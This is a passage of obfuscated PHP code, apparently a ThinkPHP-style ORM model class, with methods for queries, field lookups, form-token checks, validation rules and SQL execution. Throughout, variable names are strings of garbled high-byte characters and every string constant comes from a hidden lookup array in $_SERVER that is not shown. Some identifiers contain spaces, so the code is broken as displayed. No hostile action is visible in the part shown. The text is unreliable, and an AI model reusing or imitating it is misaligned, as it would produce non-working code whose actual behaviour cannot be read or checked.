$ëÇáßğá[290])) { $´‘ıù½ç[$ß±‹ö…Ü] = floatval($´‘ıù½ç[$ß±‹ö…Ü]); } elseif (!1 !== strpos($ ¯Äìßª, $ëÇáßğá[291])) { $´‘ıù½ç[$ß±‹ö…Ü] = (bool) $´‘ıù½ç[$ß±‹ö…Ü]; } } } public function find($ÍüçÄÉ = array()) { $ŸºÙ†í« =& $_SERVER[ä¿÷‹µ±]; if (is_numeric($ÍüçÄÉ) || is_string($ÍüçÄÉ)) { $”±Ò‡ì•[$this->getPk()] = intval($ÍüçÄÉ); $this->options[$ŸºÙ†í«[275]] = $”±Ò‡ì•; } $this->options[$ŸºÙ†í«[292]] = 1; $ÍüçÄÉ = $this->_parseOptions(); $İ÷à®§§ = $this->db->select($ÍüçÄÉ); if (!1 === $İ÷à®§§) { return !1; } if (empty($İ÷à®§§)) { return null; } $this->data = $İ÷à®§§[0]; $this->_afterFind($this->data, $ÍüçÄÉ); if (!empty($this->options[$ŸºÙ†í«[293]])) { return $this->returnResult($this->data, $this->options[$ŸºÙ†í«[293]]); } return $this->data; } protected function _afterFind(&$›ëì€ä, $Ï–Ä•È) { } protected function returnResult($¿Á¤šËä, $ÕÄ‹›ˆ¿ = '') { $³àğÒ”¢ =& $_SERVER[ä¿÷‹µ±]; if ($ÕÄ‹›ˆ¿) { if (is_callable($ÕÄ‹›ˆ¿)) { return call_user_func($ÕÄ‹›ˆ¿, $¿Á¤šËä); } switch (strtolower($ÕÄ‹›ˆ¿)) { case $³àğÒ”¢[294]: return json_encode($¿Á¤šËä); case $³àğÒ”¢[295]: return xml_encode($¿Á¤šËä); } } return $¿Á¤šËä; } public function parseFieldsMap($åÈ˜ªÑ½, $ÚôĞöê‘ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $›çİÚ‘ˆ => $Ã¡¦„¸º) { if ($ÚôĞöê‘ == 1) { if (isset($åÈ˜ªÑ½[$Ã¡¦„¸º])) { $åÈ˜ªÑ½[$›çİÚ‘ˆ] = $åÈ˜ªÑ½[$Ã¡¦„¸º]; unset($åÈ˜ªÑ½[$Ã¡¦„¸º]); } } else { if (isset($åÈ˜ªÑ½[$›çİÚ‘ˆ])) { $åÈ˜ªÑ½[$Ã¡¦„¸º] = $åÈ˜ªÑ½[$›çİÚ‘ˆ]; unset($åÈ˜ªÑ½[$›çİÚ‘ˆ]); } } } } return $åÈ˜ªÑ½; } public function setField($ÒØ‰Ã‘õ, $Ÿâì¢´Œ = '') { if (is_array($ÒØ‰Ã‘õ)) { $û¾³€€ = $ÒØ‰Ã‘õ; } else { $û¾³€€[$ÒØ‰Ã‘õ] = $Ÿâì¢´Œ; } return $this->save($û¾³€€); } public function setAdd($ ‚ÂÖŞ», $¨–Å‰¨ï = 1) { $ú‘È¨¹¨ =& $_SERVER[ä¿÷‹µ±]; $ÃÜò§œë = $ ‚ÂÖŞ» . $ú‘È¨¹¨[296] . $¨–Å‰¨ï; if ($¨–Å‰¨ï < 0) { $ÃÜò§œë = $ ‚ÂÖŞ» . $¨–Å‰¨ï; } return $this->setField($ ‚ÂÖŞ», array($ú‘È¨¹¨[297], $ÃÜò§œë)); } public function getField($ñ³©Ş¡Ò, $†ÃÑÀÃº = null) { $ò¸ŠÉŞ˜ =& $_SERVER[ä¿÷‹µ±]; $”²Üªè©[$ò¸ŠÉŞ˜[273]] = $ñ³©Ş¡Ò; $”²Üªè© = $this->_parseOptions($”²Üªè©); $ñ³©Ş¡Ò = trim($ñ³©Ş¡Ò); if (strpos($ñ³©Ş¡Ò, $ò¸ŠÉŞ˜[50])) { if (!isset($”²Üªè©[$ò¸ŠÉŞ˜[292]])) { $”²Üªè©[$ò¸ŠÉŞ˜[292]] = is_numeric($†ÃÑÀÃº) ? $†ÃÑÀÃº : $ò¸ŠÉŞ˜[12]; } $ïÛ¯àŞÒ = $this->db->select($”²Üªè©); if (!empty($ïÛ¯àŞÒ)) { $Ôí»‘Àé = explode($ò¸ŠÉŞ˜[50], $ñ³©Ş¡Ò); $ñ³©Ş¡Ò = array_keys($ïÛ¯àŞÒ[0]); $Âç§¬´Ã = array_shift($ñ³©Ş¡Ò); $¢ßô¼ªÅ = array_shift($ñ³©Ş¡Ò); $ìö¬²¶Å = array(); $¹Šøøïò = count($Ôí»‘Àé); foreach ($ïÛ¯àŞÒ as $ˆ½Ãö§) { $÷‚ªúŠ = $ˆ½Ãö§[$Âç§¬´Ã]; if (2 == $¹Šøøïò) { $ìö¬²¶Å[$÷‚ªúŠ] = $ˆ½Ãö§[$¢ßô¼ªÅ]; } else { $ìö¬²¶Å[$÷‚ªúŠ] = is_string($†ÃÑÀÃº) ? implode($†ÃÑÀÃº, $ˆ½Ãö§) : $ˆ½Ãö§; } } return $ìö¬²¶Å; } } else { if (!0 !== $†ÃÑÀÃº) { $”²Üªè©[$ò¸ŠÉŞ˜[292]] = is_numeric($†ÃÑÀÃº) ? $†ÃÑÀÃº : 1; } if ($†ÃÑÀÃº === $ò¸ŠÉŞ˜[255]) { unset($”²Üªè©[$ò¸ŠÉŞ˜[292]]); } $ˆ½Ãö§ = $this->db->select($”²Üªè©); if (!empty($ˆ½Ãö§)) { if ($†ÃÑÀÃº === $ò¸ŠÉŞ˜[255]) { return reset($ˆ½Ãö§[0]); } if (!0 !== $†ÃÑÀÃº && 1 == $”²Üªè©[$ò¸ŠÉŞ˜[292]]) { return reset($ˆ½Ãö§[0]); } foreach ($ˆ½Ãö§ as $ş’œ•İÀ) { $¿¶ãìá[] = $ş’œ•İÀ[$ñ³©Ş¡Ò]; } return $¿¶ãìá; } } return null; } public function create($Üˆø…ˆú = '', $ß“Â•µÏ = '') { $‹—éÒ»ª =& $_SERVER[ä¿÷‹µ±]; if (empty($Üˆø…ˆú)) { $Üˆø…ˆú = $_POST; } elseif (is_object($Üˆø…ˆú)) { $Üˆø…ˆú = get_object_vars($Üˆø…ˆú); } if (empty($Üˆø…ˆú) || !is_array($Üˆø…ˆú)) { $this->error = think_lang($‹—éÒ»ª[271]); return !1; } $Üˆø…ˆú = $this->parseFieldsMap($Üˆø…ˆú, 0); $ß“Â•µÏ = $ß“Â•µÏ ? $ß“Â•µÏ : (!empty($Üˆø…ˆú[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$‹—éÒ»ª[273]])) { $ÔˆŒéâ = $this->options[$‹—éÒ»ª[273]]; unset($this->options[$‹—éÒ»ª[273]]); } elseif ($ß“Â•µÏ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÔˆŒéâ = $this->insertFields; } elseif ($ß“Â•µÏ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÔˆŒéâ = $this->updateFields; } if (isset($ÔˆŒéâ)) { if (is_string($ÔˆŒéâ)) { $ÔˆŒéâ = explode($‹—éÒ»ª[50], $ÔˆŒéâ); } if (think_config($‹—éÒ»ª[298])) { $ÔˆŒéâ[] = think_config($‹—éÒ»ª[299]); } foreach ($Üˆø…ˆú as $ÀŸíÇ…ë => $§³’) { if (!in_array($ÀŸíÇ…ë, $ÔˆŒéâ)) { unset($Üˆø…ˆú[$ÀŸíÇ…ë]); } } } if (!$this->autoValidation($Üˆø…ˆú, $ß“Â•µÏ)) { return !1; } if (!$this->autoCheckToken($Üˆø…ˆú)) { $this->error = think_lang($‹—éÒ»ª[300]); return !1; } if ($this->autoCheckFields) { $ÔˆŒéâ = $this->getDbFields(); foreach ($Üˆø…ˆú as $ÀŸíÇ…ë => $§³’) { if (!in_array($ÀŸíÇ…ë, $ÔˆŒéâ)) { unset($Üˆø…ˆú[$ÀŸíÇ…ë]); } elseif (MAGIC_QUOTES_GPC && is_string($§³’)) { $Üˆø…ˆú[$ÀŸíÇ…ë] = stripslashes($§³’); } } } $this->autoOperation($Üˆø…ˆú, $ß“Â•µÏ); $this->data = $Üˆø…ˆú; return $Üˆø…ˆú; } public function autoCheckToken($ŸÚ×Š ı) { $ùæš² =& $_SERVER[ä¿÷‹µ±]; if (isset($this->options[$ùæš²[301]]) && !$this->options[$ùæš²[301]]) { return !0; } if (think_config($ùæš²[298])) { $„Û’Ñ™é = think_config($ùæš²[299]); if (!isset($ŸÚ×Š ı[$„Û’Ñ™é]) || Session::get($„Û’Ñ™é)) { return !1; } list($—‰Ë¢Ø«, $×í×ñæÓ) = explode($ùæš²[11], $ŸÚ×Š ı[$„Û’Ñ™é]); if ($×í×ñæÓ && Session::get($„Û’Ñ™é . $ùæš²[10] . $—‰Ë¢Ø«) === $×í×ñæÓ) { Session::remove($„Û’Ñ™é . $ùæš²[10] . $—‰Ë¢Ø«); return !0; } if (think_config($ùæš²[302])) { Session::remove($„Û’Ñ™é . $ùæš²[10] . $—‰Ë¢Ø«); } return !1; } return !0; } public function regex($ŞÁÔÒ­, $œíĞ²øÊ) { $Í÷¿ì÷ =& $_SERVER[ä¿÷‹µ±]; $Šœ“Äüø = array($Í÷¿ì÷[303] => $Í÷¿ì÷[304], $Í÷¿ì÷[305] => $Í÷¿ì÷[306], $Í÷¿ì÷[307] => $Í÷¿ì÷[308], $Í÷¿ì÷[309] => $Í÷¿ì÷[310], $Í÷¿ì÷[311] => $Í÷¿ì÷[312], $Í÷¿ì÷[313] => $Í÷¿ì÷[314], $Í÷¿ì÷[315] => $Í÷¿ì÷[316], $Í÷¿ì÷[290] => $Í÷¿ì÷[317], $Í÷¿ì÷[318] => $Í÷¿ì÷[319]); if (isset($Šœ“Äüø[strtolower($œíĞ²øÊ)])) { $œíĞ²øÊ = $Šœ“Äüø[strtolower($œíĞ²øÊ)]; } return preg_match($œíĞ²øÊ, $ŞÁÔÒ­) === 1; } private function autoOperation(&$÷ùã“³Œ, $†‡±¤¦¸) { $…œÎÃ =& $_SERVER[ä¿÷‹µ±]; if (!empty($this->options[$…œÎÃ[320]])) { $ÆÇ‹¨ = $this->options[$…œÎÃ[320]]; unset($this->options[$…œÎÃ[320]]); } elseif (!empty($this->_auto)) { $ÆÇ‹¨ = $this->_auto; } if (isset($ÆÇ‹¨)) { foreach ($ÆÇ‹¨ as $ş½Ş®¨¦) { if (empty($ş½Ş®¨¦[2])) { $ş½Ş®¨¦[2] = THINK_MODEL_INSERT; } if ($†‡±¤¦¸ == $ş½Ş®¨¦[2] || $ş½Ş®¨¦[2] == THINK_MODEL_BOTH) { switch (trim($ş½Ş®¨¦[3])) { case $…œÎÃ[321]: case $…œÎÃ[322]: $¡Ä¥ê¹Ô = isset($ş½Ş®¨¦[4]) ? (array) $ş½Ş®¨¦[4] : array(); if (isset($÷ùã“³Œ[$ş½Ş®¨¦[0]])) { array_unshift($¡Ä¥ê¹Ô, $÷ùã“³Œ[$ş½Ş®¨¦[0]]); } if ($…œÎÃ[321] == $ş½Ş®¨¦[3]) { $÷ùã“³Œ[$ş½Ş®¨¦[0]] = call_user_func_array($ş½Ş®¨¦[1], $¡Ä¥ê¹Ô); } else { $÷ùã“³Œ[$ş½Ş®¨¦[0]] = call_user_func_array(array(&$this, $ş½Ş®¨¦[1]), $¡Ä¥ê¹Ô); } break; case $…œÎÃ[273]: $÷ùã“³Œ[$ş½Ş®¨¦[0]] = $÷ùã“³Œ[$ş½Ş®¨¦[1]]; break; case $…œÎÃ[323]: if ($…œÎÃ[12] === $÷ùã“³Œ[$ş½Ş®¨¦[0]]) { unset($÷ùã“³Œ[$ş½Ş®¨¦[0]]); } break; case $…œÎÃ[324]: default: $÷ùã“³Œ[$ş½Ş®¨¦[0]] = $ş½Ş®¨¦[1]; } if (!1 === $÷ùã“³Œ[$ş½Ş®¨¦[0]]) { unset($÷ùã“³Œ[$ş½Ş®¨¦[0]]); } } } } return $÷ùã“³Œ; } protected function autoValidation($¨Óµ¾£ç, $¼±ëÂ¿‹) { $Õ”öß® =& $_SERVER[ä¿÷‹µ±]; if (!empty($this->options[$Õ”öß®[325]])) { $µ¹õ…Ä = $this->options[$Õ”öß®[325]]; unset($this->options[$Õ”öß®[325]]); } elseif (!empty($this->_validate)) { $µ¹õ…Ä = $this->_validate; } if (isset($µ¹õ…Ä)) { if ($this->patchValidate) { $this->error = array(); } foreach ($µ¹õ…Ä as $ıº¢–¾† => $É ‡İ«û) { if (empty($É ‡İ«û[5]) || $É ‡İ«û[5] == THINK_MODEL_BOTH || $É ‡İ«û[5] == $¼±ëÂ¿‹) { if (0 == strpos($É ‡İ«û[2], $Õ”öß®[326]) && strpos($É ‡İ«û[2], $Õ”öß®[327])) { $É ‡İ«û[2] = think_lang(substr($É ‡İ«û[2], 2, -1)); } $É ‡İ«û[3] = isset($É ‡İ«û[3]) ? $É ‡İ«û[3] : THINK_EXISTS_VALIDATE; $É ‡İ«û[4] = isset($É ‡İ«û[4]) ? $É ‡İ«û[4] : $Õ”öß®[328]; switch ($É ‡İ«û[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¨Óµ¾£ç, $É ‡İ«û)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Õ”öß®[12] != trim($¨Óµ¾£ç[$É ‡İ«û[0]])) { if (!1 === $this->_validationField($¨Óµ¾£ç, $É ‡İ«û)) { return !1; } } break; default: if (isset($¨Óµ¾£ç[$É ‡İ«û[0]])) { if (!1 === $this->_validationField($¨Óµ¾£ç, $É ‡İ«û)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($’ª¡†×¿, $î“ùœØÜ) { if (!1 === $this->_validationFieldItem($’ª¡†×¿, $î“ùœØÜ)) { if ($this->patchValidate) { $this->error[$î“ùœØÜ[0]] = $î“ùœØÜ[2]; } else { $this->error = $î“ùœØÜ[2]; return !1; } } return; } protected function _validationFieldItem($Ú¿±å†², $ ı¨ÛŞ) { $’Ø´¥ =& $_SERVER[ä¿÷‹µ±]; switch (strtolower(trim($ ı¨ÛŞ[4]))) { case $’Ø´¥[321]: case $’Ø´¥[322]: $–‹ÌŞÉ° = isset($ ı¨ÛŞ[6]) ? (array) $ ı¨ÛŞ[6] : array(); if (is_string($ ı¨ÛŞ[0]) && strpos($ ı¨ÛŞ[0], $’Ø´¥[50])) { $ ı¨ÛŞ[0] = explode($’Ø´¥[50], $ ı¨ÛŞ[0]); } if (is_array($ ı¨ÛŞ[0])) { foreach ($ ı¨ÛŞ[0] as $œ«Œù•å) { $Ğ«ŒÛÆ[$œ«Œù•å] = $Ú¿±å†²[$œ«Œù•å]; } array_unshift($–‹ÌŞÉ°, $Ğ«ŒÛÆ); } else { array_unshift($–‹ÌŞÉ°, $Ú¿±å†²[$ ı¨ÛŞ[0]]); } if ($’Ø´¥[321] == $ ı¨ÛŞ[4]) { return call_user_func_array($ ı¨ÛŞ[1], $–‹ÌŞÉ°); } else { return call_user_func_array(array(&$this, $ ı¨ÛŞ[1]), $–‹ÌŞÉ°); } case $’Ø´¥[329]: return $Ú¿±å†²[$ ı¨ÛŞ[0]] == $Ú¿±å†²[$ ı¨ÛŞ[1]]; case $’Ø´¥[330]: if (is_string($ ı¨ÛŞ[0]) && strpos($ ı¨ÛŞ[0], $’Ø´¥[50])) { $ ı¨ÛŞ[0] = explode($’Ø´¥[50], $ ı¨ÛŞ[0]); } $¿õ¾¬± = array(); if (is_array($ ı¨ÛŞ[0])) { foreach ($ ı¨ÛŞ[0] as $œ«Œù•å) { $¿õ¾¬±[$œ«Œù•å] = $Ú¿±å†²[$œ«Œù•å]; } } else { $¿õ¾¬±[$ ı¨ÛŞ[0]] = $Ú¿±å†²[$ ı¨ÛŞ[0]]; } if (!empty($Ú¿±å†²[$this->getPk()])) { $¿õ¾¬±[$this->getPk()] = array($’Ø´¥[331], $Ú¿±å†²[$this->getPk()]); } if ($this->where($¿õ¾¬±)->find()) { return !1; } return !0; default: return $this->check($Ú¿±å†²[$ ı¨ÛŞ[0]], $ ı¨ÛŞ[1], $ ı¨ÛŞ[4]); } } public function check($íæø»ÍÏ, $ì­ù„©, $µ¥¦ = "\x72\x65\x67\145\170") { $¾Â¤àĞµ =& $_SERVER[ä¿÷‹µ±]; $µ¥¦ = strtolower(trim($µ¥¦)); switch ($µ¥¦) { case $¾Â¤àĞµ[7]: case $¾Â¤àĞµ[332]: $¸¹…½¶ß = is_array($ì­ù„©) ? $ì­ù„© : explode($¾Â¤àĞµ[50], $ì­ù„©); return $µ¥¦ == $¾Â¤àĞµ[7] ? in_array($íæø»ÍÏ, $¸¹…½¶ß) : !in_array($íæø»ÍÏ, $¸¹…½¶ß); case $¾Â¤àĞµ[333]: case $¾Â¤àĞµ[334]: if (is_array($ì­ù„©)) { $˜Áã¹ › = $ì­ù„©[0]; $úîè€×ç = $ì­ù„©[1]; } else { list($˜Áã¹ ›, $úîè€×ç) = explode($¾Â¤àĞµ[50], $ì­ù„©); } return $µ¥¦ == $¾Â¤àĞµ[333] ? $íæø»ÍÏ >= $˜Áã¹ › && $íæø»ÍÏ <= $úîè€×ç : $íæø»ÍÏ < $˜Áã¹ › || $íæø»ÍÏ > $úîè€×ç; case $¾Â¤àĞµ[335]: case $¾Â¤àĞµ[336]: return $µ¥¦ == $¾Â¤àĞµ[335] ? $íæø»ÍÏ == $ì­ù„© : $íæø»ÍÏ != $ì­ù„©; case $¾Â¤àĞµ[337]: $ˆË¸ƒş€ = mb_strlen($íæø»ÍÏ, $¾Â¤àĞµ[338]); if (strpos($ì­ù„©, $¾Â¤àĞµ[50])) { list($˜Áã¹ ›, $úîè€×ç) = explode($¾Â¤àĞµ[50], $ì­ù„©); return $ˆË¸ƒş€ >= $˜Áã¹ › && $ˆË¸ƒş€ <= $úîè€×ç; } else { return $ˆË¸ƒş€ == $ì­ù„©; } case $¾Â¤àĞµ[339]: list($”‚ÑæØÙ, $‚³ôÉ‘) = explode($¾Â¤àĞµ[50], $ì­ù„©); if (!is_numeric($”‚ÑæØÙ)) { $”‚ÑæØÙ = strtotime($”‚ÑæØÙ); } if (!is_numeric($‚³ôÉ‘)) { $‚³ôÉ‘ = strtotime($‚³ôÉ‘); } return NOW_TIME >= $”‚ÑæØÙ && NOW_TIME <= $‚³ôÉ‘; case $¾Â¤àĞµ[340]: return in_array(get_client_ip(), explode($¾Â¤àĞµ[50], $ì­ù„©)); case $¾Â¤àĞµ[341]: return !in_array(get_client_ip(), explode($¾Â¤àĞµ[50], $ì­ù„©)); case $¾Â¤àĞµ[328]: default: return $this->regex($íæø»ÍÏ, $ì­ù„©); } } public function query($ÀöÔÏ²è, $ˆƒù¯„ı = false) { $ã¤Âàú× =& $_SERVER[ä¿÷‹µ±]; if (!is_bool($ˆƒù¯„ı) && !is_array($ˆƒù¯„ı)) { $ˆƒù¯„ı = func_get_args(); array_shift($ˆƒù¯„ı); } $ÀöÔÏ²è = str_replace(array($ã¤Âàú×[231], $ã¤Âàú×[342]), $ã¤Âàú×[53], $ÀöÔÏ²è); $ÀöÔÏ²è = $this->parseSql($ÀöÔÏ²è, $ˆƒù¯„ı); return $this->db->query($ÀöÔÏ²è); } public function execute($Ú¶°ú, $ù»°İ’¦ = false) { if (!is_bool($ù»°İ’¦) && !is_array($ù»°İ’¦)) { $ù»°İ’¦ = func_get_args(); array_shift($ù»°İ’¦); } $Ú¶°ú = $this->parseSql($Ú¶°ú, $ù»°İ’¦); return $this->db->execute($Ú¶°ú); } protected function parseSql($½úµÚæ†, $ø±ÉëÀ—) { $ÅíÉıë =& $_SERVER[ä¿÷‹µ±]; if (!0 === $ø±ÉëÀ—) { $ø’’Êü‚ = $this->_parseOptions(); $½úµÚæ† = $this->db->parseSql($½úµÚæ†, $ø’’Êü‚); } elseif (is_array($ø±ÉëÀ—)) { $ø±ÉëÀ— = array_map(array($this->db, $ÅíÉıë[343]), $ø±ÉëÀ—); $½úµÚæ† = vsprintf($½úµÚæ†, $ø±ÉëÀ—); } else { $½úµÚæ† = strtr($½úµÚæ†, array($ÅíÉıë[344] => $this->getTableName(), $ÅíÉıë[345] => think_config($ÅíÉıë[244]))); } $this->db->setModel($this->name); return $½úµÚæ†; } public function db($ø¯ô¡¼Ù = '', $¬ç²û¼ = '', $Š¯¶èàÒ = array()) { $ÔÉ’ãà¸ =& $_SERVER[ä¿÷‹µ±]; if ($ÔÉ’ãà¸[12] === $ø¯ô¡¼Ù && $this->db) { return $this->db; } static $÷¡ƒİš = array(); static $¶“ğµì = array(); if (!isset($¶“ğµì[$ø¯ô¡¼Ù]) || isset($¶“ğµì[$ø¯ô¡¼Ù]) && $¬ç²û¼ && $÷¡ƒİš[$ø¯ô¡¼Ù] != $¬ç²û¼) { if (!empty($¬ç²û¼) && is_string($¬ç²û¼) && !1 === strpos($¬ç²û¼, $ÔÉ’ãà¸[8])) { $¬ç²û¼ = think_config($¬ç²û¼); } $ø¯ô¡¼Ù = think_guid($¬ç²û¼); $¶“ğµì[$ø¯ô¡¼Ù] = Db::getInstance($¬ç²û¼); } elseif (NULL === $¬ç²û¼) { $¶“ğµì[$ø¯ô¡¼Ù]->close(); unset($¶“ğµì[$ø¯ô¡¼Ù]); return; } if (!empty($Š¯¶èàÒ)) { if (is_string($Š¯¶èàÒ)) { parse_str($Š¯¶èàÒ, $Š¯¶èàÒ); } foreach ($Š¯¶èàÒ as $ó¡ˆà¨ï => $óí¥ÄáŸ) { $this->setProperty($ó¡ˆà¨ï, $óí¥ÄáŸ); } } $÷¡ƒİš[$ø¯ô¡¼Ù] = $¬ç²û¼; $this->db = $¶“ğµì[$ø¯ô¡¼Ù]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $úµûğõ— = get_class($this); if ($úµûğõ— == $_SERVER[ä¿÷‹µ±][346]) { return $this->name; } $this->name = substr($úµûğõ—, 0, -5); } return $this->name; } public function getTableName() { $—Úû™ùè =& $_SERVER[ä¿÷‹µ±]; if (empty($this->trueTableName)) { $½²²ëâ¦ = !empty($this->tablePrefix) ? $this->tablePrefix : $—Úû™ùè[12]; if (!empty($this->tableName)) { $½²²ëâ¦ .= $this->tableName; } else { $½²²ëâ¦ .= think_parse_name($this->name); } $this->trueTableName = strtolower($½²²ëâ¦); } return (!empty($this->dbName) ? $this->dbName . $—Úû™ùè[10] : $—Úû™ùè[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ø¶ô‡©  =& $_SERVER[ä¿÷‹µ±]; return isset($this->fields[$Ø¶ô‡© [251]]) ? $this->fields[$Ø¶ô‡© [251]] : $this->pk; } public function getDbFields() { $ˆÂ™âÇ‘ =& $_SERVER[ä¿÷‹µ±]; if (isset($this->options[$ˆÂ™âÇ‘[279]])) { $¦š­«ÀÄ = $this->db->getFields($this->options[$ˆÂ™âÇ‘[279]]); return $¦š­«ÀÄ ? array_keys($¦š­«ÀÄ) : !1; } if ($this->fields) { $¦š­«ÀÄ = $this->fields; unset($¦š­«ÀÄ[$ˆÂ™âÇ‘[250]], $¦š­«ÀÄ[$ˆÂ™âÇ‘[251]], $¦š­«ÀÄ[$ˆÂ™âÇ‘[252]], $¦š­«ÀÄ[$ˆÂ™âÇ‘[249]]); return $¦š­«ÀÄ; } return !1; } public function data($Ú¯ ÕÍˆ = '') { $ÂÍ£œ€ =& $_SERVER[ä¿÷‹µ±]; if ($ÂÍ£œ€[12] === $Ú¯ ÕÍˆ && !empty($this->data)) { return $this->data; } if (is_object($Ú¯ ÕÍˆ)) { $Ú¯ ÕÍˆ = get_object_vars($Ú¯ ÕÍˆ); } elseif (is_string($Ú¯ ÕÍˆ)) { parse_str($Ú¯ ÕÍˆ, $Ú¯ ÕÍˆ); } elseif (!is_array($Ú¯ ÕÍˆ)) { think_exception(think_lang($ÂÍ£œ€[271])); } $this->data = $Ú¯ ÕÍˆ; return $this; } public function join($ÚÂç€›) { $áãÉ€€¾ =& $_SERVER[ä¿÷‹µ±]; if (is_array($ÚÂç€›)) { $this->options[$áãÉ€€¾[282]] = $ÚÂç€›; } elseif (!empty($ÚÂç€›)) { $this->options[$áãÉ€€¾[282]][] = $ÚÂç€›; } return $this; } public function union($•ÁñàŸ’, $ ³³¡ÊÌ = false) { $ûš»£¯Ò =& $_SERVER[ä¿÷‹µ±]; if (empty($•ÁñàŸ’)) { return $this; } if ($ ³³¡ÊÌ) { $this->options[$ûš»£¯Ò[347]][$ûš»£¯Ò[348]] = !0; } if (is_object($•ÁñàŸ’)) { $•ÁñàŸ’ = get_object_vars($•ÁñàŸ’); } if (is_string($•ÁñàŸ’)) { $‹æÏ¢ˆ˜ = $•ÁñàŸ’; } elseif (is_array($•ÁñàŸ’)) { if (isset($•ÁñàŸ’[0])) { $this->options[$ûš»£¯Ò[347]] = array_merge($this->options[$ûš»£¯Ò[347]], $•ÁñàŸ’); return $this; } else { $‹æÏ¢ˆ˜ = $•ÁñàŸ’; } } else { think_exception(think_lang($ûš»£¯Ò[271])); } $this->options[$ûš»£¯Ò[347]][] = $‹æÏ¢ˆ˜; return $this; } public function cache($–¶Æ‘ = true, $å“åŞÖ  = null, $”ñÍºº­ = '') { $ˆÊºäü =& $_SERVER[ä¿÷‹µ±]; if (!1 !== $–¶Æ‘) { $this->options[$ˆÊºäü[349]] = array($ˆÊºäü[94] => $–¶Æ‘, $ˆÊºäü[339] => $å“åŞÖ , $ˆÊºäü[33] => $”ñÍºº­); } return $this; } public function field($…Šªß¦, $ÍÎÌ¶ò = false) { $ÆÊ¶ßÓÌ =& $_SERVER[ä¿÷‹µ±]; if (!0 === $…Šªß¦) { $éåÀ“Ø = $this->getDbFields(); $…Šªß¦ = $éåÀ“Ø ? $éåÀ“Ø : $ÆÊ¶ßÓÌ[188]; } elseif ($ÍÎÌ¶ò) { if (is_string($…Šªß¦)) { $…Šªß¦ = explode($ÆÊ¶ßÓÌ[50], $…Šªß¦); } $éåÀ“Ø = $this->getDbFields(); $…Šªß¦ = $éåÀ“Ø ? array_diff($éåÀ“Ø, $…Šªß¦) : $…Šªß¦; } $this->options[$ÆÊ¶ßÓÌ[273]] = $…Šªß¦; return $this; } public function scope($øûğ€Âà = '', $…ø°„×† = NULL) { $õ»ÓéÏ =& $_SERVER[ä¿÷‹µ±]; if ($õ»ÓéÏ[12] === $øûğ€Âà) { if (isset($this->_scope[$õ»ÓéÏ[37]])) { $«¬ì×ôÀ = $this->_scope[$õ»ÓéÏ[37]]; } else { return $this; } } elseif (is_string($øûğ€Âà)) { $ÛÙ´Ù¹ğ = explode($õ»ÓéÏ[50], $øûğ€Âà); $«¬ì×ôÀ = array(); foreach ($ÛÙ´Ù¹ğ as $Ò…§ØŠ) { if (!isset($this->_scope[$Ò…§ØŠ])) { continue; } $«¬ì×ôÀ = array_merge($«¬ì×ôÀ, $this->_scope[$Ò…§ØŠ]); } if (!empty($…ø°„×†) && is_array($…ø°„×†)) { $«¬ì×ôÀ = array_merge($«¬ì×ôÀ, $…ø°„×†); } } elseif (is_array($øûğ€Âà)) { $«¬ì×ôÀ = $øûğ€Âà; } if (is_array($«¬ì×ôÀ) && !empty($«¬ì×ôÀ)) { $this->options = array_merge($this->options, array_change_key_case($«¬ì×ôÀ)); } return $this; } public function where($òÀ’ÔÅÑ, $øÖŞô­… = null) { $æ¼Ô•× =& $_SERVER[ä¿÷‹µ±]; if (!is_null($øÖŞô­…) && is_string($òÀ’ÔÅÑ)) { if (!is_array($øÖŞô­…)) { $øÖŞô­… = func_get_args(); array_shift($øÖŞô­…); } $øÖŞô­… = array_map(array($this->db, $æ¼Ô•×[343]), $øÖŞô­…); $òÀ’ÔÅÑ = vsprintf($òÀ’ÔÅÑ, $øÖŞô­…); } elseif (is_object($òÀ’ÔÅÑ)) { $òÀ’ÔÅÑ = get_object_vars($òÀ’ÔÅÑ); } elseif (is_array($òÀ’ÔÅÑ)) { foreach ($òÀ’ÔÅÑ as $™ò…×öû => $Ù®§¤ˆù) { if ((is_numeric($™ò…×öû) || !$™ò…×öû) && is_string($Ù®§¤ˆù)) { if (strpos($Ù®§¤ˆù, $æ¼Ô•×[350]) === 0) { continue; } think_trace($æ¼Ô•×[351], $æ¼Ô•×[12], $æ¼Ô•×[49]); die; } } } if (is_string($òÀ’ÔÅÑ) && $æ¼Ô•×[12] != $òÀ’ÔÅÑ) { $ÂË‹¤” = array(); $ÂË‹¤”[$æ¼Ô•×[352]] = $òÀ’ÔÅÑ; $òÀ’ÔÅÑ = $ÂË‹¤”; } if (isset($this->options[$æ¼Ô•×[275]])) { $this->options[$æ¼Ô•×[275]] = array_merge($this->options[$æ¼Ô•×[275]], $òÀ’ÔÅÑ); } else { $this->options[$æ¼Ô•×[275]] = $òÀ’ÔÅÑ; } return $this; } public function limit($¬üŸÜŞı, $¬…“¡ş‹ = null) { $Åƒ«ˆ¿¿ =& $_SERVER[ä¿÷‹µ±]; $this->options[$Åƒ«ˆ¿¿[292]] = is_null($¬…“¡ş‹) ? $¬üŸÜŞı : $¬üŸÜŞı . $Åƒ«ˆ¿¿[50] . $¬…“¡ş‹; return $this; } public function page($ôïæùĞ—, $Ó­…òœ— = null) { $é¤Ş˜˜ =& $_SERVER[ä¿÷‹µ±]; $this->options[$é¤Ş˜˜[353]] = is_null($Ó­…òœ—) ? $ôïæùĞ— : $ôïæùĞ— . $é¤Ş˜˜[50] . $Ó­…òœ—; return $this; } public function comment($ÃÂàš‹) { $this->options[$_SERVER[ä¿÷‹µ±][354]] = $ÃÂàš‹; return $this; } public function setProperty($å¾Æô¡ß, $âĞşŸ‰×) { if (property_exists($this, $å¾Æô¡ß)) { $this->{$å¾Æô¡ß} = 